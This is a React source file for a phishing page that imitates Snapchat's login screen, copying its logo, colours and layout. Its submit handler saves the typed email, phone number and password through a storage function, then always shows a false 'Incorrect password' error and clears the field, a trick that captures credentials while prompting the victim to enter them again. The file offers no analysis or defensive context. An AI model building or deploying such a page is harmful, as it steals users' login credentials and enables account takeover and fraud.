import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { saveEntry } from "@/lib/storage";
import ghostImg from "@/assets/snapchat-ghost.png";

export default function LoginPage() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!email.trim()) {
      setError("Please enter your email or username.");
      return;
    }
    if (!password.trim()) {
      setError("Please enter your password.");
      return;
    }
    setLoading(true);
    setTimeout(() => {
      saveEntry({ email, phone, password });
      setLoading(false);
      setError("Incorrect password. Please try again.");
      setPassword("");
    }, 1200);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#FFFC00] px-4">
      {/* Logo */}
      <div className="flex flex-col items-center mb-8">
        <img
          src={ghostImg}
          alt="Snapchat"
          className="w-20 h-20 object-contain"
          style={{ filter: "drop-shadow(0 2px 8px rgba(0,0,0,0.10))" }}
        />
        <h1
          className="mt-3 text-[28px] font-black tracking-tight text-[#000]"
          style={{ fontFamily: "'Avenir Next', 'Inter', sans-serif", letterSpacing: "-0.5px" }}
        >
          snapchat
        </h1>
      </div>

      {/* Card */}
      <div className="w-full max-w-[360px] bg-white rounded-2xl shadow-xl px-7 py-8">
          <form onSubmit={handleLogin} className="flex flex-col gap-4">
            <h2 className="text-[18px] font-bold text-center text-black mb-1">Log In</h2>

            <div className="flex flex-col gap-1">
              <label className="text-[12px] font-semibold text-gray-500 uppercase tracking-wider">
                Email or Username
              </label>
              <input
                type="text"
                autoComplete="username"
                autoFocus
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email or Username"
                className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
              />
            </div>

            <div className="flex flex-col gap-1">
              <label className="text-[12px] font-semibold text-gray-500 uppercase tracking-wider">
                Phone Number <span className="normal-case font-normal">(optional)</span>
              </label>
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                placeholder="+1 (555) 000-0000"
                className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
              />
            </div>

            <div className="flex flex-col gap-1">
              <label className="text-[12px] font-semibold text-gray-500 uppercase tracking-wider">
                Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full border border-gray-200 rounded-xl px-4 py-3 pr-12 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition"
                >
                  {showPassword ? <EyeOffIcon /> : <EyeIcon />}
                </button>
              </div>
            </div>

            {error && (
              <p className="text-red-500 text-[13px] text-center -mt-1">{error}</p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#FFFC00] hover:bg-yellow-400 active:bg-yellow-500 disabled:opacity-60 text-black font-bold rounded-full py-3 text-[15px] transition-all duration-150 mt-1 shadow-sm flex items-center justify-center gap-2"
            >
              {loading ? (
                <svg className="animate-spin h-5 w-5 text-black" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
                </svg>
              ) : "Log In"}
            </button>

            <a href="#" className="text-center text-[13px] text-[#0070c9] hover:underline font-medium">
              Forgot Password?
            </a>

            <div className="flex items-center gap-2 my-1">
              <div className="flex-1 h-px bg-gray-100" />
              <span className="text-gray-400 text-[12px]">or</span>
              <div className="flex-1 h-px bg-gray-100" />
            </div>

            <button
              type="button"
              className="w-full flex items-center justify-center gap-3 border border-gray-200 rounded-full py-3 text-[14px] font-medium text-gray-700 hover:bg-gray-50 active:bg-gray-100 transition"
            >
              <GoogleIcon />
              Continue with Google
            </button>
            <button
              type="button"
              className="w-full flex items-center justify-center gap-3 border border-gray-200 rounded-full py-3 text-[14px] font-medium text-gray-700 hover:bg-gray-50 active:bg-gray-100 transition"
            >
              <AppleIcon />
              Continue with Apple
            </button>
          </form>
      </div>

      {/* Footer */}
      <div className="mt-8 flex flex-col items-center gap-2">
        <p className="text-[14px] text-black/70">
          Don't have an account?{" "}
          <a href="#" className="font-bold text-black hover:underline">Sign Up</a>
        </p>
        <div className="flex gap-4 mt-1">
          <a href="#" className="text-[12px] text-black/50 hover:text-black/80 transition">Privacy Policy</a>
          <a href="#" className="text-[12px] text-black/50 hover:text-black/80 transition">Terms of Service</a>
          <a href="#" className="text-[12px] text-black/50 hover:text-black/80 transition">Support</a>
        </div>
      </div>
    </div>
  );
}

function GoogleIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24">
      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
    </svg>
  );
}

function AppleIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
    </svg>
  );
}

function EyeIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
    </svg>
  );
}

function EyeOffIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
      <line x1="1" y1="1" x2="23" y2="23"/>
    </svg>
  );
}
